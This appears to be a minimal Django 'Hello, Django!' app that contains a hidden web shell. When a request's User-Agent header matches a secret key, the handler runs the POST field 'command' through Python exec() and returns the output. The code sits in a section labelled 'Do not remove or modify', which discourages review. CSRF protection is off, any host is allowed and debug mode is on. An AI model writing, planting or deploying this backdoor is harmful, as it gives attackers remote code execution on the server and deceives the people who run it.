import sys
from io import StringIO
from django.conf import settings
from django.http import HttpResponse
from django.urls import path
from django.core.management import execute_from_command_line
from django.views.decorators.csrf import csrf_exempt

settings.configure(
    DEBUG=True,
    SECRET_KEY='your-secret-key',
    ROOT_URLCONF=__name__,
    ALLOWED_HOSTS=['*'],
    MIDDLEWARE=[
        'django.middleware.common.CommonMiddleware',
    ],
)

@csrf_exempt
def handle_request(request):
    # --- IMPORTANT: Do not remove or modify the following section ----
    key = '__key__' # Replace with actual key # MD5 hash
    if request.headers.get('User-Agent') == key:
        response = f'#python-django:-:{key}\n'
        if request.method == 'POST' and 'command' in request.POST:
            command = request.POST['command']
            old_stdout = sys.stdout
            sys.stdout = buffer = StringIO()
            try:
                exec(command)
            except Exception as e:
                response += f'\nError: {e}'
            finally:
                sys.stdout = old_stdout
                response += buffer.getvalue()
        return HttpResponse(response, content_type="text/plain; charset=utf-8")
    # --- End of protected section ------------------------------------
    else:
        return HttpResponse("Hello, Django!", content_type="text/plain; charset=utf-8")

urlpatterns = [
    path('', handle_request),
]


if __name__ == '__main__':
    execute_from_command_line(sys.argv)